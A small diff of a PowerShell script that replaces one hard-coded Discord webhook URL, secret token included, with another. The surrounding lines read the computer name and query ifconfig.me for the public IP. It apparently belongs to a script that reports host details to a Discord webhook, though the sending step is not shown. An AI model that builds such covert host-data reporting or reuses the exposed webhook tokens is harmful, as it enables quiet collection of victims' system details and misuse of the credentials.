@@ -2,7 +2,7 @@ param (
   [string]$var1
 )
 
-$URL = "https://discordapp.com/api/webhooks/1275806536853360721/33x2JRHpS4QPusXR3oSRPn2z8V1ALPejJcXKlgm56hEH5Q8iYjNI40GJI_y8WXO6x17R"
+$URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
 
 Write-Output "Hello, $Env:ComputerName!"
 $IP = Invoke-WebRequest("ifconfig.me")
